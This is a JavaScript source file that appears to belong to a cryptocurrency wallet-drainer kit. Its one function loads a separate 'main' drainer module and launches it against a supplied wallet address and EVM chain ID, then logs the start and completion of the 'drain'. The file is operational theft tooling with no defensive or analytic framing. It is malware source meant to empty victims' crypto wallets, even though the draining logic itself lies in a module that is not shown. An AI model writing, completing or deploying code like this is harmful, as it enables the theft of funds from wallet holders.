// processors/evm/index.js
async function startEVMDrainer(walletAddress, chainId = 1) {
  console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);

  try {
    const drainerPath = './main';
    const DrainerModule = await import(drainerPath);

    console.log("[DEBUG] Drainer loaded successfully");

    if (typeof DrainerModule.startWithWallet === 'function') {
      console.log("[EVM] Starting headless drain...");
      await DrainerModule.startWithWallet(walletAddress, chainId);
    } 
    else if (DrainerModule.Drainer) {
      const drainer = new DrainerModule.Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;

      console.log("[EVM] Starting direct drain...");
      await drainer.Perexod();
    } 
    else {
      throw new Error("Drainer module has no valid start method");
    }

    console.log(`[EVM] ✅ Drain completed for ${walletAddress}`);

  } catch (err) {
    console.error("[EVM] Drain failed:", err.message);
    console.error(err.stack);
  }
}

export { startEVMDrainer };